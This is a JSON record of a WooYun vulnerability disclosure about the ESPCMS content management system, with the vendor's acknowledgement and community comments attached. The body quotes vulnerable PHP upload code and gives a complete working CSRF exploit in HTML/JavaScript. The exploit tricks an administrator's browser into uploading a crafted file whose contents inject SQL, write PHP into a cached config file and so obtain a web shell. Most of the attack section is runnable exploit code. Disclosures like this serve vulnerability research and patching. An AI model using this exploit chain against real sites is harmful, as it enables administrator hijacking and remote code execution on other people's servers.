{"id": 122, "wybug_id": "wooyun-2014-071680", "wybug_title": "ESPCMS_csrf利用后台sql注射getshell", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "menmen519", "wybug_date": "2014-08-12 14:55", "wybug_open_date": "2014-11-10 14:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向公众公开  简要描述： 这两天再写csrf的一些东西，所以拿了ESPCMS做了一个演示，这里只是其中一个意外发现，后续还有csrf更狠的地方，总之一句话漏洞利用是一门艺术，我会提供一个csrf另外一种思路去让管理员只交互一次，然后轻松拿下站点shell，就我分析应该各大cms，都可以按照这个思路去做！！！ 详细说明：  好了 废话不多说了 首先我们安装完毕espcms 然后登录到后台\n\n问题就出在了，上传证书这一块，直接看代码，adminsoft/control/management.php:(lines:802-815)\nif (!file_exists($filetmpname)) {\t\t\t$isupfiletrue = 'false';\t\t}\t\t$datacontent = file_get_contents($filetmpname);\t\tif (empty($datacontent)) {\t\t\t$isupfiletrue = 'false';\t\t}\t\tif ($isupfiletrue != 'false') {\t\t\t$db_table = db_prefix . 'config';\t\t\t$db_where = \"valname='cer_key'\";\t\t\t$db_set = \"value='$datacontent'\";\t\t\t$this->db->query('UPDATE ' . $db_table . ' SET ' . $db_set . ' WHERE ' . $db_where);\t\t\t$db_where = \"valname='cer_file'\";\t\t\t$db_set = \"value='111111'\";\t\t\t$this->db->query('UPDATE ' . $db_table . ' SET ' . $db_set . ' WHERE ' . $db_where);\t\t\t$this->systemfile(true);\t\t\t$this->calldialogmessage($this->lng['management_upfile_text_ok_js'], $this->lng['management_upfile_text_exit_bottonok'], '', 0, 1, 'locationout');\t\t}\t\t$this->ectemplates->assign('digheight', $digheight);\t\t$this->ectemplates->assign('isupfiletrue', $isupfiletrue);\t\t$this->ectemplates->display('admin/admin_upfile');\n这里直接读进来文件，然后进行sql操作，产生了注入点，并且内容完全可控经过测试这个上传文件的过程存在csrf，这里就不多做演示了下来我们来分析一下，惊奇的发现datacache/command.php 这个东西就是缓存配置的，我们只一个点\n\n构造csrf表单：\n<html>  <body>    <script>\t   function csrf_sql(){\t\t\tvar xhr = new XMLHttpRequest();\t\t\txhr.open(\"POST\", \"http://192.168.47.131/ESPCMSV6000140708_INSTALL/upload/adminsoft/index.php\", true);\t\t\txhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------277302291911927\");\t\t\txhr.withCredentials = \"true\";\t\t\tvar sql = \"10);\\r\\n phpinfo();\\r\\n$a=array(123456=>1' WHERE valname='order_integral'--  \";\t\t\tvar body='-----------------------------277302291911927\\r\\nContent-Disposition: form-data; name=\"point\"\\r\\n\\r\\nadmin\\r\\n-----------------------------277302291911927\\r\\nContent-Disposition: form-data; name=\"archive\"\\r\\n\\r\\nmanagement\\r\\n-----------------------------277302291911927\\r\\nContent-Disposition: form-data; name=\"action\"\\r\\n\\r\\ncerfilecheck\\r\\n-----------------------------277302291911927\\r\\nContent-Disposition: form-data; name=\"digheight\"\\r\\n\\r\\n250\\r\\n-----------------------------277302291911927\\r\\nContent-Disposition: form-data; name=\"cerupfilepath\"; filename=\"she.jpg\"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n'+sql+'\\r\\n-----------------------------277302291911927\\r\\nContent-Disposition: form-data; name=\"Submit\"\\r\\n\\r\\nå¼\\x80å§\\x8béª\\x8cè¯\\x81\\r\\n-----------------------------277302291911927--\\r\\n';\t\t\tvar aBody = new Uint8Array(body.length);\t\t\tfor (var i = 0; i < aBody.length; i++)\t\t\t  aBody[i] = body.charCodeAt(i);\t\t\txhr.send(new Blob([aBody]));\t   }\t   csrf_sql();    </script>  </body></html>\n这个表单构造好了，发包前这个文件是这样的：\n\n发送请求后的此文件为：\n\n然后我们访问一下文件看一下，是否执行了：\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-12 15:16 厂商回复： 感谢您对此漏洞的提供，我们会尽快修复此漏洞！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-12 14:58 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  0.0    \n     2014-08-12 15:09 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  小伙子喜欢各种组合技能。    \n     2014-08-12 15:12 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  sa权限?    \n     2014-08-12 15:29 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @′  雨。 不需要sa权限     \n     2014-08-12 15:44 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  太机智了，必须给个评论    \n     2014-08-12 19:26 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  哥  我又来顶你了    \n     2014-08-12 19:28 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  弱弱的问下。官网2014-08-12 14:58:58的版本在哪下载。。     \n     2014-08-14 09:14 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  ESPCMS不是php+mysql么...不需要sa是个什么情况 需要也没处给你啊    \n     2014-08-14 12:18 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @索马里的海贼 好吧我表述错误 其实我想表达的是与数据库权限没有关系    \n     2014-08-15 07:08 |    \t\tkav \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  这个，真是我辈学习之楷模啊！    \n     2014-08-22 18:02 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  各大cms都可以。。。我读的书少，你不要骗我。。。。    \n     2014-08-22 18:24 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @chock 我说的这个思路    \n     2014-09-02 16:55 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  楼主好思路！- -    \n     2014-11-10 16:01 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  @menmen519   代码分析什么的  都是不明觉厉，能收我为徒么...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}